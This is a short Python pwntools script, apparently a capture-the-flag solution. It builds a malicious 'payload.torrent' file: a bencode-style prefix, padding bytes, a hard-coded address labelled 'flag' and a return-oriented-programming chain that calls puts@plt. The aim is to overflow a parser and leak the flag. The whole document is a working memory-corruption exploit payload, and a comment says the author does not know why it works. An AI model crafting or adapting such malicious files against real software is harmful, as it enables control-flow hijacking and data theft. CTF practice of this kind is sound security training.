from pwn import *

rop_chain = b''
rop_chain += p64(0x4008c0) # puts@plt

payload = b"d1:a1:#"
payload += b'@' * 24

# Idk why the fuck this is working
payload += p64(0x401b58) # flag
payload += b'@' * 16
payload += rop_chain

with open('payload.torrent', 'wb') as f:
    f.write(payload)
